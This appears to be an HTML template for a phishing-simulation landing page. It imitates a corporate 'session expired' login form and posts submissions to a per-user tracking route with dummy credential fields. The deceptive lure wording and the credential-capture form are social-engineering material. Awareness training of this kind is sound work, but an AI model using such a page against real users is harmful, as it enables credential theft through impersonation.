<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Central Portal Authentication</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { 
            background-color: #f4f6f9; 
            min-height: 100vh;
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px;
        }
        .login-card { 
            width: 100%; 
            max-width: 400px; 
            padding: 35px; 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.08); 
            background: #ffffff; 
        }
        .btn-primary { 
            background-color: #0056b3; 
            border: none; 
        }
        .btn-primary:hover {
            background-color: #004085;
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="text-center mb-4">
        <h4 class="fw-bold text-dark">Central Portal Authentication</h4>
        <p class="text-muted small">Your session has expired. Please re-authenticate your workstation credentials to clear the alert state.</p>
    </div>
    
    <form action="/track/login-attempt/{{ user_id }}" method="POST">
        <div class="mb-3">
            <label class="form-label small fw-bold text-secondary">Corporate Email / Username</label>
            <input type="text" name="dummy_username" class="form-control py-2" placeholder="username@domain.local" required>
        </div>
        <div class="mb-4">
            <label class="form-label small fw-bold text-secondary">Account Security Password</label>
            <input type="password" name="dummy_password" class="form-control py-2" placeholder="••••••••" required>
        </div>
        <button type="submit" class="btn btn-primary w-100 py-2 fw-bold">Synchronize Profile</button>
    </form>
</div>

</body>
</html>
